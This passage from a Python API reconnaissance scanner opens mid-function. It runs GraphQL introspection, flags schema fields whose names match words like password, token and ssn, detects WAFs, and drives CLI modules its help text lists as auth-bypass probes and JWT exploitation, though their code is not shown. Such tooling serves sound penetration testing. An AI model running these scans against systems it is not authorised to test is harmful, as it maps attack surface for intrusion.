                        if max_endpoints and len(gql_endpoints) >= max_endpoints:
                            break
            except Exception:
                pass

    if not gql_endpoints:
        print(f"  No GraphQL endpoints found")
        return findings

    findings["endpoints"] = gql_endpoints

    # Phase 2: Introspection query
    for endpoint in gql_endpoints[:max_endpoints if max_endpoints else len(gql_endpoints)]:
        print(f"\n  Introspecting {endpoint}...")

        try:
            r = session.post(base + endpoint,
                             data=INTROSPECTION_QUERY,
                             headers={"Content-Type": "application/json"},
                             timeout=timeout)

            if r.status_code != 200:
                print(f"  ✗ Introspection returned {r.status_code}")
                try:
                    r = session.get(base + endpoint,
                                    params={"query": json.loads(INTROSPECTION_QUERY)["query"]},
                                    timeout=timeout)
                except Exception:
                    continue

            try:
                data = r.json()
            except Exception:
                print(f"  ✗ Response is not valid JSON")
                continue

            errors = data.get("errors", [])
            schema = data.get("data", {}).get("__schema")

            if not schema:
                if errors:
                    for err in errors[:3]:
                        msg = err.get("message", "")
                        print(f"  ✗ {msg[:80]}")
                    if any("introspection" in str(e.get("message", "")).lower() for e in errors):
                        print(f"  → Introspection is disabled (good security practice)")
                continue

            findings["introspection"] = True
            print(f"  ⚠ INTROSPECTION ENABLED — full schema exposed!")

            types = schema.get("types", [])
            query_type = schema.get("queryType", {}).get("name", "Query")
            mutation_type = (schema.get("mutationType") or {}).get("name", "")

            user_types = [t for t in types if not t["name"].startswith("__")]
            object_types = [t for t in user_types if t.get("kind") == "OBJECT"]
            input_types = [t for t in user_types if t.get("kind") == "INPUT_OBJECT"]
            enum_types = [t for t in user_types if t.get("kind") == "ENUM"]

            print(f"\n  Schema Summary")
            print(f"  {'─' * 55}")
            print(f"    Types:      {len(user_types)} ({len(object_types)} objects, {len(input_types)} inputs, {len(enum_types)} enums)")

            # Queries
            query_obj = next((t for t in types if t["name"] == query_type), None)
            if query_obj and query_obj.get("fields"):
                queries = query_obj["fields"]
                findings["queries"] = [q["name"] for q in queries]
                print(f"    Queries:    {len(queries)}")
                for q in queries[:15]:
                    ret_type = q.get("type", {}).get("name") or q.get("type", {}).get("ofType", {}).get("name", "")
                    args = ", ".join(a["name"] for a in q.get("args", [])[:4])
                    args_str = f"({args})" if args else ""
                    print(f"      • {q['name']}{args_str} → {ret_type}")
                if len(queries) > 15:
                    print(f"      ... and {len(queries) - 15} more")

            # Mutations
            if mutation_type:
                mut_obj = next((t for t in types if t["name"] == mutation_type), None)
                if mut_obj and mut_obj.get("fields"):
                    mutations = mut_obj["fields"]
                    findings["mutations"] = [m["name"] for m in mutations]
                    print(f"    Mutations:  {len(mutations)}")
                    for m in mutations[:15]:
                        ret_type = m.get("type", {}).get("name") or m.get("type", {}).get("ofType", {}).get("name", "")
                        args = ", ".join(a["name"] for a in m.get("args", [])[:4])
                        args_str = f"({args})" if args else ""
                        print(f"      • {m['name']}{args_str} → {ret_type}")
                    if len(mutations) > 15:
                        print(f"      ... and {len(mutations) - 15} more")

            # Interesting types (password, token, secret, email, admin)
            sensitive_keywords = ["password", "secret", "token", "admin", "role",
                                  "permission", "ssn", "credit", "private", "internal"]
            interesting = []
            for t in user_types:
                for field in (t.get("fields") or []):
                    fname = field["name"].lower()
                    if any(kw in fname for kw in sensitive_keywords):
                        interesting.append(f"{t['name']}.{field['name']}")

            if interesting:
                print(f"\n  ⚠ Sensitive Fields")
                print(f"  {'─' * 55}")
                for field in interesting[:20]:
                    print(f"    • {field}")
                findings["types"] = interesting

        except Exception as e:
            print(f"  ✗ Error: {type(e).__name__}: {e}")

    return findings


# ── WAF RESULTS SUMMARY ──

def waf_summary(waf_detections):
    print(f"\n  WAF DETECTION RESULTS")
    print(f"  {'─' * 55}")

    if waf_detections:
        sorted_wafs = sorted(waf_detections.items(), key=lambda x: x[1]["score"], reverse=True)
        for waf_name, data in sorted_wafs:
            score = data["score"]
            evidence = list(set(data["evidence"]))
            confidence = "HIGH" if score >= 5 else "MEDIUM" if score >= 3 else "LOW"
            icon = "⚠" if confidence == "HIGH" else "•"
            print(f"  {icon} {waf_name}  [confidence: {confidence}, score: {score}]")
            for e in evidence[:6]:
                print(f"      → {e}")
    else:
        print(f"  No WAF/firewall signatures detected")


# ── JSON EXPORT ──

def export_json(output_path, base, hits, waf_detections, tech_detections=None,
                header_findings=None, auth_findings=None, gql_findings=None,
                jwt_findings=None, swagger_findings=None, oauth2_findings=None,
                soap_findings=None, websocket_findings=None, jsonrpc_findings=None,
                asyncapi_findings=None):
    data = {
        "target": base,
        "paths": hits,
        "waf": {name: {"score": d["score"], "evidence": list(set(d["evidence"]))}
                for name, d in waf_detections.items()},
        "technologies": {key: {"category": d["category"], "name": d["name"],
                                "evidence": d["evidence"]}
                         for key, d in (tech_detections or {}).items()},
        "security_headers": header_findings or {},
        "auth_bypass": auth_findings or [],
        "jwt_exploit": jwt_findings or [],
        "graphql": gql_findings or {},
        "swagger": swagger_findings or {},
        "oauth2": oauth2_findings or {},
        "soap": soap_findings or {},
        "websocket": websocket_findings or {},
        "jsonrpc": jsonrpc_findings or {},
        "asyncapi": asyncapi_findings or {},
    }
    with open(output_path, "w") as f:
        json.dump(data, f, indent=2, default=str)
    print(f"\n  JSON saved to {output_path}")


# ── MAIN ──

def main():
    parser = argparse.ArgumentParser(
        description="API Recon · Endpoint Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modules:
  paths     Path/directory brute-force
  cors      CORS misconfiguration check
  methods   HTTP method enumeration
  headers   Security headers audit
  auth      Auth bypass probes (header injection, path tricks, JWT)
  jwt       Deep JWT exploitation (alg confusion, claim escalation, IDOR)
  graphql   GraphQL introspection & schema dump
  swagger   Swagger/OpenAPI spec discovery & endpoint extraction
  oauth2    OAuth2/OIDC discovery endpoint detection
  soap      SOAP/WSDL discovery & operation extraction
  websocket WebSocket endpoint detection
  jsonrpc   JSON-RPC / XML-RPC endpoint discovery
  asyncapi  AsyncAPI (event-driven) spec discovery
  waf       WAF/firewall detection
  tech      Technology stack fingerprinting
  tls       TLS/certificate analysis
  ratelimit Rate limiting detection
  all       Run everything (default)

Examples:
  python3 api_recon.py -u https://api.target.com
  python3 api_recon.py -u https://api.target.com -m waf,tls,headers
  python3 api_recon.py -u https://api.target.com -m auth,jwt,graphql,swagger
  python3 api_recon.py -f targets.txt -m paths,cors
  python3 api_recon.py -u https://api.target.com -w wordlist.txt
  python3 api_recon.py -u https://api.target.com --timeout 15 -o results.json
  cat urls.txt | python3 api_recon.py --stdin -m waf
        """,
    )
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-f", "--file", help="File with target URLs (one per line)")
    parser.add_argument("--stdin", action="store_true", help="Read targets from stdin")
    parser.add_argument("-m", "--modules", default="all",
                        help="Comma-separated modules to run (default: all)")
    parser.add_argument("-w", "--wordlist", help="Custom path wordlist file")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--rate-count", type=int, default=20,
                        help="Number of requests for rate limit test (default: 20)")
    parser.add_argument("-p", "--processes", type=int, default=1,
                        help="Concurrent worker threads for path and GraphQL discovery (default: 1)")
    parser.add_argument("--graphql-probe-timeout", type=int, default=4,
                        help="Timeout for GraphQL endpoint probing in seconds (default: 4)")
    parser.add_argument("--graphql-max-endpoints", type=int, default=1,
                        help="Max GraphQL endpoints to introspect per target (default: 1)")
    parser.add_argument("--user-agent", default="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0",
                        help="Custom User-Agent string")
    parser.add_argument("-o", "--output", help="Save results as JSON")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    # argparse exits immediately for -h/--help, so print banner first in that case.
    if "-h" in sys.argv or "--help" in sys.argv:
        banner()
    args = parser.parse_args()
    if "-h" not in sys.argv and "--help" not in sys.argv:
        banner()
    if not args.verbose:
        print("  [i] Quiet mode: findings-only output. Use -v for full scan output.\n")

    if not args.url and not args.file and not args.stdin:
        parser.print_help()
        sys.exit(1)

    targets = load_targets(args)
    if not targets:
        print("  ✗ No targets provided")
        sys.exit(1)

    modules = [m.strip().lower() for m in args.modules.split(",")]
    run_all = "all" in modules

    wordlist = PATHS
    if args.wordlist:
        wordlist = load_wordlist(args.wordlist)

    session = build_session(args.user_agent)

    def run_module(func, *fn_args, **fn_kwargs):
        if args.verbose:
            return func(*fn_args, **fn_kwargs)
        with redirect_stdout(io.StringIO()):
            return func(*fn_args, **fn_kwargs)

    for base in targets:
        if not base.startswith("http"):
            base = f"https://{base}"

        parsed = urlparse(base)
        hostname = parsed.hostname
        port = parsed.port or 443

        if args.verbose:
            print(f"\n  TARGET: {base}")
            print(f"  {'─' * 55}")

        try:
            session.head(base + "/", timeout=args.timeout)
        except requests.exceptions.ConnectionError:
            print(f"[{base}] unreachable (connection refused/dropped)")
            continue
        except requests.exceptions.ReadTimeout:
            print(f"[{base}] timeout ({args.timeout}s)")
            continue
        except requests.exceptions.SSLError as e:
            print(f"[{base}] SSL warning: {str(e)[:80]}")
        except Exception:
            pass

        hits = []
        baseline_code = 404
        cors_results = {}
        waf_results = {}
        tech_results = {}
        header_results = {}
        auth_results = []
        jwt_results = []
        gql_results = {}
        swagger_results = {}
        oauth2_results = {}
        soap_results = {}
        websocket_results = {}
        jsonrpc_results = {}
        asyncapi_results = {}

        if run_all or "paths" in modules:
            hits, baseline_code = run_module(
                path_discovery,
                base,
                session,
                args.timeout,
                wordlist,
                processes=max(1, args.processes),
                user_agent=args.user_agent,
            )

        if run_all or "cors" in modules:
            cors_results = run_module(cors_check, base, session, args.timeout)

        if run_all or "methods" in modules:
            run_module(method_test, base, session, args.timeout, hits)

        if run_all or "paths" in modules:
            run_module(dump_responses, hits)

        if run_all or "headers" in modules:
            header_results = run_module(headers_audit, base, session, args.timeout)

        if run_all or "auth" in modules:
            auth_results = run_module(auth_bypass, base, session, args.timeout)

        if run_all or "jwt" in modules:
            jwt_results = run_module(jwt_exploit, base, session, args.timeout)

        if run_all or "graphql" in modules:
            gql_results = run_module(
                graphql_check,
                base,
                session,
                args.timeout,
                processes=max(1, args.processes),
                user_agent=args.user_agent,
                probe_timeout=args.graphql_probe_timeout,
                max_endpoints=max(1, args.graphql_max_endpoints),
            )

        if run_all or "swagger" in modules:
            swagger_results = run_module(swagger_check, base, session, args.timeout)

        if run_all or "oauth2" in modules:
            oauth2_results = run_module(oauth2_check, base, session, args.timeout)

        if run_all or "soap" in modules:
            soap_results = run_module(soap_check, base, session, args.timeout)

        if run_all or "websocket" in modules:
            websocket_results = run_module(websocket_check, base, session, args.timeout)

        if run_all or "jsonrpc" in modules:
            jsonrpc_results = run_module(jsonrpc_check, base, session, args.timeout)

        if run_all or "asyncapi" in modules:
            asyncapi_results = run_module(asyncapi_check, base, session, args.timeout)

        if run_all or "waf" in modules:
            waf_results = run_module(waf_detect, base, session, args.timeout, baseline_code)

        if run_all or "tech" in modules:
            tech_results = run_module(tech_detect, base, session, args.timeout)

        if run_all or "ratelimit" in modules:
            rate_limit_test(base, session, args.rate_count) if args.verbose else run_module(rate_limit_test, base, session, args.rate_count)

        if run_all or "tls" in modules:
            run_module(tls_check, hostname, port, args.timeout) if not args.verbose else tls_check(hostname, port, args.timeout)

        if args.verbose and waf_results:
            waf_summary(waf_results)

        if not args.verbose:
            printed_any = False

            notable_hits = [h for h in hits if h.get("code") in (401, 403, 405) or h.get("code", 0) >= 500]
            if notable_hits:
                printed_any = True
                print(f"\n[{base}] path findings ({len(notable_hits)})")
                for h in notable_hits[:15]:
                    print(f"  - {h['path']} -> {h['code']} ({h['size']}b)")

            if cors_results and (cors_results.get("origins") or cors_results.get("reflected_evil")):
                printed_any = True
                print(f"\n[{base}] cors findings")
                if cors_results.get("reflected_evil"):
                    print("  - reflected arbitrary origin (evil.com)")
                for item in cors_results.get("origins", [])[:5]:
                    print(f"  - origin={item['origin']} acao={item['acao']}")

            if header_results:
                weak = header_results.get("weak", [])
                missing = header_results.get("missing", [])
                info_leak = header_results.get("info_leak", [])
                if weak or missing or info_leak:
                    printed_any = True
                    print(f"\n[{base}] header findings")
                    if weak:
                        print(f"  - weak headers: {len(weak)}")
                    if missing:
                        print(f"  - missing headers: {len(missing)}")
                    if info_leak:
                        print(f"  - info leak headers: {len(info_leak)}")

            if auth_results:
                printed_any = True
                print(f"\n[{base}] auth findings: {len(auth_results)}")
                for f in auth_results[:8]:
                    print(f"  - {f.get('type')} @ {f.get('path')}")

            if jwt_results:
                printed_any = True
                print(f"\n[{base}] jwt findings: {len(jwt_results)}")
                for f in jwt_results[:8]:
                    detail = f.get("alg") or f.get("claims") or f.get("user_id") or f.get("keyword") or ""
                    print(f"  - {f.get('type')} @ {f.get('path')} {detail}".rstrip())

            if gql_results and (gql_results.get("introspection") or gql_results.get("types")):
                printed_any = True
                print(f"\n[{base}] graphql findings")
                if gql_results.get("introspection"):
                    print("  - introspection enabled")
                if gql_results.get("types"):
                    print(f"  - sensitive fields: {len(gql_results.get('types', []))}")

            if swagger_results and (swagger_results.get("specs") or swagger_results.get("endpoints")):
                printed_any = True
                print(f"\n[{base}] swagger findings")
                if swagger_results.get("specs"):
                    for s in swagger_results["specs"][:3]:
                        print(f"  - {s['path']} ({s.get('version', '')})")
                if swagger_results.get("endpoints"):
                    print(f"  - endpoints: {len(swagger_results['endpoints'])}")

            if oauth2_results and oauth2_results.get("endpoints"):
                printed_any = True
                print(f"\n[{base}] oauth2 findings")
                for e in oauth2_results["endpoints"][:3]:
                    print(f"  - {e['path']}")

            if soap_results and soap_results.get("endpoints"):
                printed_any = True
                print(f"\n[{base}] soap findings")
                for e in soap_results["endpoints"][:3]:
                    print(f"  - {e['path']}")

            if websocket_results and websocket_results.get("endpoints"):
                printed_any = True
                print(f"\n[{base}] websocket findings: {len(websocket_results['endpoints'])}")

            if jsonrpc_results and jsonrpc_results.get("endpoints"):
                printed_any = True
                print(f"\n[{base}] jsonrpc findings")
                for e in jsonrpc_results["endpoints"][:3]:
                    print(f"  - {e['path']} ({e.get('type', '')})")

            if asyncapi_results and asyncapi_results.get("specs"):
                printed_any = True
                print(f"\n[{base}] asyncapi findings")
                for s in asyncapi_results["specs"][:3]:
                    print(f"  - {s['path']}")

            if waf_results:
                printed_any = True
                top = sorted(waf_results.items(), key=lambda x: x[1].get("score", 0), reverse=True)[:3]
                print(f"\n[{base}] waf findings")
                for name, data in top:
                    print(f"  - {name} (score={data.get('score', 0)})")

            if tech_results:
                printed_any = True
                print(f"\n[{base}] tech findings: {len(tech_results)} fingerprints")

            # Quiet mode: print only targets with findings.

        if args.output:
            export_json(args.output, base, hits, waf_results, tech_results,
                        header_results, auth_results, gql_results, jwt_results,
                        swagger_results, oauth2_results, soap_results,
                        websocket_results, jsonrpc_results, asyncapi_results)

    if args.verbose:
        print(f"\n  DONE\n")


if __name__ == "__main__":
    main()
